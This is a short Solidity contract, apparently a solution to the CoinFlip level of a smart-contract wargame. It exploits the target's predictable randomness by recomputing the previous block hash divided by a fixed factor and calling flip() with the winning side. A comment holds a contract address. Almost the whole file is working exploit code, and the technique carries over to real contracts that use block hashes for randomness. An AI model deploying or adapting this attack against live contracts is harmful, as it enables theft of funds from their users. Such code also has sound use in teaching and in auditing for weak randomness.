pragma solidity ^0.4.18;

import 'SafeMath.sol';
import 'CoinFlip.sol';

//0x987ED236b64304F40b0D7577eBC550b2a56E146b
contract CoinFlipCrack {
  using SafeMath for uint256;
  CoinFlip flipper;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlipCrack(address aimAddr) public {
      flipper = CoinFlip(aimAddr);
  }

  function auto_flip() public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    bool result = flipper.flip(side);
    return result;
  }
}




